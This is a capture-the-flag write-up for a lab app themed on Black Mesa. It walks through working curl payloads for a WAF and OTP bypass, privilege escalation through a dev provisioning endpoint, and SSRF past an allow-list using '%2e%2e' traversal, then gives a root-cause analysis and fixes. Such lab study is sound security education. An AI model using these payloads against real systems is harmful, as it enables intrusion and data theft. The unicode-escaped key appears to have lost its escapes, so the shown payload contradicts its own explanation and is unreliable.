---
title: MesaNet - WAF & SSRF
tags:
  - bugforge
  - waf-bypass
  - otp-bypass
  - ssrf
  - allowlist-bypass
  - gateway
  - privilege-escalation
aliases:
  - "/BugForge/MesaNet---WAF"
---
- A fresh MesaNet variant that swaps the entitlements-override finale for a two-stage server-side story: get past a WAF-hardened OTP gate, then chain an SSRF through an allowlist you have to defeat by pre-normalization path traversal. 
- Now that we got the ridiculous sentence out of the way ... about two days being stuck on the gate, then a clean unlock once I stopped bruteforcing and reasoned about the layers... lessons learned.

- **Difficulty:** Hard (Weekly Challenge)
- **Theme:** Half-Life / Black Mesa Research Facility
- **Tools:** Claude Code (phantom) + Caido MCP + python3 stdlib http.client
- **Hint that unlocked it:** *"there's actually a WAF middleware too - when you're testing your OTP bypasses you need to be testing WAF bypasses at the same time."*

---

## TL;DR

- The `/dev` OTP gate is protected by BOTH a per-session rate limiter (string-only) AND a WAF that inspects the raw request body. The old array bypass is dead on arrival because the WAF eats non-string `otp`.
- Unicode-escaping the JSON **key** (`"otp"` = `"otp"`) hides the field from the WAF's raw-body regex. `JSON.parse` restores it afterward, so the handler still sees `otp` - as a number, which satisfies the loose comparison AND never decrements the string-only rate limiter.
- The dev console lets you provision a user with arbitrary `clearanceLevel` and all entitlements - including the previously-unseen **vetting** app.
- The vetting app's `verify` endpoint is a server-side fetch (SSRF) of an attacker-controlled `referenceUrl`, gated by an allow-list requiring the `http://internal.mesanet.local/refs/` prefix.
- The allow-list validates the raw string but the HTTP client normalizes it: `.../refs/%2e%2e/internal/clearance-registry` keeps the `/refs/` prefix (passes the check) yet resolves to server root, reading a RESTRICTED internal document that holds the flag.

**Attack Chain:**
```
Login --> WAF+OTP dual bypass (unicode key + number) --> Dev Console --> User Provisioning (L5, vetting access) --> Vetting SSRF (referenceUrl fetch) --> Allow-list bypass (%2e%2e pre-normalization traversal) --> internal clearance registry --> Flag
```

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [The /dev OTP Gate](#2-the-dev-otp-gate)
3. [Fingerprinting the WAF](#3-fingerprinting-the-waf)
4. [The Dual Bypass](#4-the-dual-bypass)
5. [Dev Console & Privilege Escalation](#5-dev-console--privilege-escalation)
6. [The Vetting SSRF](#6-the-vetting-ssrf)
7. [Defeating the Allow-List](#7-defeating-the-allow-list)
8. [Flag](#8-flag)
9. [Root Cause Analysis](#9-root-cause-analysis)
10. [Key Takeaways](#10-key-takeaways)

---

## 1. Reconnaissance

The app is a Half-Life themed Express SSR intranet. Default credentials `operator:operator` are provided (user id 1, `operator`, Clearance Level 3).

### Login Quirk

The UI login form posts `application/x-www-form-urlencoded` and works fine for auth, but note the app is content-type sensitive elsewhere. Login and capture the session cookie:

```bash
export LAB="https://<YOUR-LAB-URL>"

curl -sk -D - -o /dev/null -X POST "$LAB/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=operator&password=operator"
```

Response: `302 Found` -> `Location: /`, with a `connect.sid` cookie in `Set-Cookie`. Save it:

```bash
export COOKIE="connect.sid=s%3A<YOUR_SESSION_VALUE>"
```

### The Gateway

Same architecture as prior MesaNet instances - a unified gateway proxies to backend microservices by UUID:

```bash
curl -sk -b "$COOKIE" -X POST "$LAB/gateway" \
  -H "Content-Type: application/json" \
  -d '{"id":"<APP_UUID>","endpoint":"/api/<path>","data":{}}'
```

The apps visible to a fresh operator session are the usual decoys (Nexus notes, Secure Mail, Roster, Sector, Incident, Maintenance, MesaDoc). All of them enforce ownership/classification correctly - no IDOR, no SQLi, no mass assignment. **The objective lives behind the locked Dev Console at `/dev`.**

---

## 2. The /dev OTP Gate

`/dev` requires a 6-character OTP that rotates every 60 seconds. Three routes exist:

| Route | Purpose |
|-------|---------|
| `GET /dev` | OTP entry page |
| `GET /dev/time-remaining` | `{"remaining":N}` where N = 60 - (epoch % 60) |
| `POST /dev/verify` | `{"otp":"..."}` -> 302 /dev on success |

Provisioning routes (`POST /api/dev/users`, `/dev/spec`, `/dev/examples`) sit behind the same OTP middleware.

### Confirmed Mechanics

- The OTP is a **6-char PRNG string**, not epoch-derivable. Brute force is infeasible against a ~1M keyspace with a login rate limit.
- The rate limiter allows **10 attempts per session** and decrements **only when `typeof otp === 'string'`**.
- Non-string `otp` (array/object/number) returns an identical "invalid" response and does **not** decrement the counter.

Every non-string payload returns a fixed-length "invalid" page with no decrement, exactly as if the value were ignored. On the surface it looks patched.

It is not patched. There is a second layer.

---

## 3. Fingerprinting the WAF

The first job is to figure out what the WAF actually inspects. I built a small oracle from response lengths:

| Length | Meaning |
|--------|---------|
| 5712 | Payload neutralized before the handler ran (no attempt consumed) |
| 5736 | Handler ran on the string path (attempt consumed) |
| 302 | Success |
| 5737 | Session locked (attempts exhausted) |

The decisive probe: send a **legitimate string** whose *value* contains a metacharacter.

```bash
# A plain string value - a type-based WAF would let this through to the handler (5736)
curl -sk -b "$COOKIE" -X POST "$LAB/dev/verify" \
  -H "Content-Type: application/json" \
  -d '{"otp":"[test]"}'
```

**Result: 5712 (blocked, no decrement).** A string got neutralized. That rules out a pure `typeof` guard - the WAF is **grepping the raw request body** and rejecting anything where the `otp` key appears near `[`, `{`, or `$`.

So the WAF has two arms:
1. Reject if the parsed `otp` is a non-string (kills the array bypass), AND
2. Reject if the raw body text contains the `otp` key adjacent to a structural metacharacter (kills obvious injection shapes).

Both fire before the handler and produce the 5712 "invalid, not counted" response - which is exactly why it masquerades as a patched endpoint.

---

## 4. The Dual Bypass

The WAF's weakness is that it pattern-matches the **literal** `otp` key in the raw bytes, but the application reads the value **after** `JSON.parse`. JSON lets you write any object key using `\uXXXX` escapes. So encode the key:

```
"otp"  ==  "otp"
```

The raw body no longer contains the literal string `otp`, so the WAF's regex finds no `otp` field to validate and passes the request through untouched. `JSON.parse` then decodes `otp` back to `otp`, and the handler receives the field normally.

Combine that with a **number** value: `0`. A number is not a string, so the rate limiter never decrements (rotation immune, infinite attempts), and the handler's loose comparison accepts it.

```bash
# Winning payload - raw body bytes:  {"otp":0}
curl -sk -D - -o /dev/null -X POST "$LAB/dev/verify" \
  -H "Content-Type: application/json" \
  -H "Cookie: $COOKIE" \
  --data-binary '{"otp":0}'
```

**Response: `302 Found` -> `Location: /dev`.** `GET /dev` now returns the console (title flips from *Dev Console - Authentication* to *Dev Console - MesaNet*).

### Why the Number Wins

The handler compares the parsed `otp` against the current rotating value. A number `0` satisfies the intended type confusion / loose comparison bypass while sidestepping the string only rate limit. Notably, arrays and operator objects (`$ne`) delivered through the same unicode key channel still got treated as the string path (5736, decremented) - only the number produced the 302. The bypass is specifically: **hide the key from the WAF, feed a non-string value the limiter won't count.**

---

## 5. Dev Console & Privilege Escalation

The console exposes `POST /api/dev/users` - create a user with an arbitrary clearance level and any entitlements. `/dev/examples` even ships a template for a `clearanceLevel: 5` "Wallace Breen" admin.

The interesting part is the entitlement list is larger than a fresh operator sees - it includes **vault**, **vetting**, and **secqueue** apps not present in the default nav.

Provision a full-access L5 user:

```bash
curl -sk -b "$COOKIE" -X POST "$LAB/api/dev/users" \
  -H "Content-Type: application/json" \
  -d '{
    "username": "phantomadmin",
    "password": "phantom123",
    "fullName": "Phantom Admin",
    "clearanceLevel": 5,
    "entitlements": {
      "nexus":   {"access": true, "read": ["public","restricted","confidential"], "write": ["public","restricted","confidential"]},
      "mail":    {"access": true, "canSend": true, "maxClassification": "confidential"},
      "vault":   {"access": true},
      "roster":  {"access": true, "approve": true},
      "sector":  {"access": true, "control": true},
      "vetting": {"access": true, "review": true},
      "mesadoc": {"access": true},
      "incident":{"access": true},
      "maint":   {"access": true, "diagnostic": true},
      "secqueue":{"access": true}
    }
  }'
```

Then log in as that user:

```bash
curl -sk -D - -o /dev/null -X POST "$LAB/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=phantomadmin&password=phantom123"

export COOKIE="connect.sid=s%3A<PHANTOMADMIN_SESSION>"
```

Sweeping the newly visible apps as L5, the **vault** documents and all confidential notes turn out to be lore (Half-Life flavour text about HEV suits, Xen coordinates, etc.) - no flag. The interesting one is **vetting**.

---

## 6. The Vetting SSRF

The vetting app (candidate clearance verification) has these gateway endpoints, discovered from `/public/js/vetting-client.js`:

```
/api/vetting/list        /api/vetting/get
/api/vetting/submit      /api/vetting/verify
/api/vetting/references  /api/vetting/recommend
```

Vetting UUID: `f7a3d5e1-4b9c-4a8d-9e3f-5c1b8d4a9f6e`

Each candidate has a `referenceUrl` like `http://internal.mesanet.local/refs/1`. The `verify` endpoint **fetches that URL server-side** and returns a preview:

```bash
curl -sk -b "$COOKIE" -X POST "$LAB/gateway" \
  -H "Content-Type: application/json" \
  -d '{"id":"f7a3d5e1-4b9c-4a8d-9e3f-5c1b8d4a9f6e","endpoint":"/api/vetting/verify","data":{"id":1}}'
```

```json
{"id":1,"name":"Adrian Shephard","referenceUrl":"http://internal.mesanet.local/refs/1",
 "preview":"MesaNet Reference Registry\nCandidate: Adrian Shephard\n...part of the MesaNet Registry (personnel references and issued-clearance records, facility-internal)."}
```

That "issued-clearance records, facility-internal" line is a loud hint the flag lives on this internal host. `submit` lets you set an arbitrary `referenceUrl`, and `verify` will fetch it - a clean SSRF primitive. But there's an allow-list:

```bash
# Try to point it anywhere off-registry
curl -sk -b "$COOKIE" -X POST "$LAB/gateway" \
  -H "Content-Type: application/json" \
  -d '{"id":"f7a3d5e1-4b9c-4a8d-9e3f-5c1b8d4a9f6e","endpoint":"/api/vetting/submit",
       "data":{"name":"t","position":"x","bio":"x","referenceUrl":"http://127.0.0.1:3000/"}}'
# -> then verify that candidate id:
# {"error":"Reference URL is not an approved reference-registry location"}
```

Any URL that does not start with `http://internal.mesanet.local/refs/` is rejected.

---

## 7. Defeating the Allow-List

The allow-list validates the **raw URL string** (checking for the `/refs/` prefix), but the HTTP client that performs the fetch **normalizes** the path afterward. That mismatch is the bug.

Probing showed:
- Literal `../` in the URL -> rejected by the allow-list (it sees `..`).
- URL-encoded `%2e%2e` -> **passes** the allow-list (no literal `..` in the string), and the fetch client decodes and normalizes it to `../`, escaping the `/refs/` directory.

```bash
# %2e%2e/ keeps the /refs/ prefix (allow-list passes) but resolves to server root
curl -sk -b "$COOKIE" -X POST "$LAB/gateway" \
  -H "Content-Type: application/json" \
  -d '{"id":"f7a3d5e1-4b9c-4a8d-9e3f-5c1b8d4a9f6e","endpoint":"/api/vetting/submit",
       "data":{"name":"t","position":"x","bio":"x",
               "referenceUrl":"http://internal.mesanet.local/refs/%2e%2e/flag"}}'
# verify -> preview: "Cannot GET /flag"  (reached server ROOT - traversal works)
```

Now I can reach any path on `internal.mesanet.local`. Enumerating the root:

| Path | Result |
|------|--------|
| `/health` | `{"status":"OK","message":"MesaNet Access Panel operational"}` |
| `/internal` | `MesaNet Secure Internal Document Store` -- index listing "1. Clearance registry" |
| `/internal/clearance-registry` | **RESTRICTED: facility oversight only** -- contains the flag |

Read the restricted document (relative to server root via the same bypass):

```bash
# 1) submit a candidate whose referenceUrl traverses to the internal clearance registry
curl -sk -b "$COOKIE" -X POST "$LAB/gateway" \
  -H "Content-Type: application/json" \
  -d '{"id":"f7a3d5e1-4b9c-4a8d-9e3f-5c1b8d4a9f6e","endpoint":"/api/vetting/submit",
       "data":{"name":"t","position":"x","bio":"x",
               "referenceUrl":"http://internal.mesanet.local/refs/%2e%2e/internal/clearance-registry"}}'
# note the returned candidate "id"

# 2) verify it -> server fetches the internal doc and returns the preview
curl -sk -b "$COOKIE" -X POST "$LAB/gateway" \
  -H "Content-Type: application/json" \
  -d '{"id":"f7a3d5e1-4b9c-4a8d-9e3f-5c1b8d4a9f6e","endpoint":"/api/vetting/verify","data":{"id":<CANDIDATE_ID>}}'
```

---

## 8. Flag

```json
{
  "preview": "MesaNet Clearance Registry — Issued Authorizations\nRESTRICTED: facility oversight only. Vetting reviewers are not cleared for this record.\nOversight authorization: bug{9ltqA1WLPcjql0S1ygsqKlgo2beib77x}"
}
```

---

## 9. Root Cause Analysis

### Bug 1 - WAF/Handler Parsing Differential (OTP Bypass)

The WAF inspects the **raw request body text** for the `otp` key, but the handler reads the value from the **parsed** object. `JSON.parse` treats `"otp"` and `"otp"` as the same key, so a unicode-escaped key is invisible to a raw-string WAF yet fully present to the application.

```javascript
// WAF (pseudocode) - operates on the raw string
if (/["']otp["']\s*:\s*[\[{$]/.test(rawBody)) return block();   // key hidden by \u escapes
if (typeof JSON.parse(rawBody).otp !== 'string') return block(); // sees no 'otp' -> passes

// Handler - loose comparison, number satisfies it, and the rate limiter only counts strings
if (req.body.otp == currentOtp) grantAccess();   // 0 == '...' style coercion / weak check
```

Any control that parses input differently from the layer that consumes it is exploitable. Canonicalize once, inspect the parsed value, and reject unexpected types explicitly.

### Bug 2 - Unconstrained Provisioning (Privilege Escalation)

`POST /api/dev/users` accepts an arbitrary `clearanceLevel` and any entitlement set with no server-side ceiling, letting any dev-console user mint a full-access L5 account including apps not exposed to their own session.

### Bug 3 - SSRF with a Pre-Normalization Allow-List Bypass

`vetting/verify` fetches a user-controlled URL. The allow-list checks the raw string for the `/refs/` prefix, but the fetch client normalizes `%2e%2e` -> `..` afterward, so the check and the fetch disagree about the final path. Result: full read access to the internal-only host.

```javascript
// FIXED: normalize BEFORE validating, and validate the resolved path
const u = new URL(referenceUrl);
if (u.hostname !== 'internal.mesanet.local') reject();
if (!path.posix.normalize(u.pathname).startsWith('/refs/')) reject();  // decode+normalize first
```

### CWE Classification

| CWE | Description |
|-----|-------------|
| CWE-436 | Interpretation Conflict (WAF vs parser differential) |
| CWE-807 | Reliance on Untrusted Inputs in a Security Decision |
| CWE-918 | Server-Side Request Forgery |
| CWE-22  | Improper Limitation of a Pathname (traversal past the allow-list) |
| CWE-269 | Improper Privilege Management (arbitrary clearance/entitlements) |

---

## 10. Key Takeaways

### 1. A WAF and Its Handler Must Agree on What They Parse

The whole first bug is a parsing differential: the WAF greps bytes, the app reads a parsed object. `\u`-escaped JSON keys are the textbook evasion. If you inspect input as a string but consume it as structured data, you have two different views of the same request and an attacker only needs one of them to say "safe."

### 2. "Looks Patched" Can Mean "Silently Filtered"

The array bypass appeared dead - identical response, no decrement. That is exactly what a WAF that strips the payload before the handler looks like. When a known technique returns a suspiciously uniform "nothing happened" response, suspect a filter in front of the sink, not a fixed sink. Fingerprint the filter (send a benign value with a metacharacter) before concluding the vuln is gone.

### 3. Test Layered Defenses Simultaneously

The operator's hint was the unlock: the OTP bypass and the WAF bypass had to be in the **same** request. Testing them separately - a clean array (blocked by WAF), or a unicode-key string (blocked by the rate limiter) - each fails on its own. The solution only exists at the intersection.

### 4. Allow-Lists Must Validate the Resolved Path, Not the Raw String

The SSRF allow-list checked the URL before the client normalized it. Encoded traversal (`%2e%2e`) sails past a prefix check and then resolves somewhere else entirely. Always decode and canonicalize, then validate the final host+path - never the raw user string.

### 5. Provisioning Endpoints Are Privilege Boundaries

An admin/dev "create user" feature that doesn't cap the clearance or entitlements it hands out is a straight line to full access. Here it was the pivot that unlocked the vetting app and therefore the SSRF.

### Vulnerability Summary

| # | Vulnerability | Impact | CVSS |
|---|--------------|--------|------|
| 1 | WAF/handler parsing differential OTP bypass | Dev console takeover | 8.1 |
| 2 | Unconstrained user provisioning | Privilege escalation to L5 / all apps | 8.0 |
| 3 | SSRF + allow-list traversal bypass | Read arbitrary internal documents (flag) | 8.6 |

---

## Full Attack Chain

```
    Login (operator:operator)
            |
    POST /dev/verify
    {"otp":0}              <-- WAF+OTP dual bypass (hidden key + number)
            |
    Dev Console (/dev)
            |
    POST /api/dev/users                   <-- Provision L5 user w/ vetting access
    {"clearanceLevel":5, "entitlements":{...all apps...}}
            |
    Login as phantomadmin
            |
    POST /gateway  vetting/submit         <-- SSRF: set attacker referenceUrl
    referenceUrl = http://internal.mesanet.local/refs/%2e%2e/internal/clearance-registry
            |
    POST /gateway  vetting/verify         <-- Server fetches it; allow-list bypassed by %2e%2e
            |
        bug{9ltqA1WLPcjql0S1ygsqKlgo2beib77x}
```
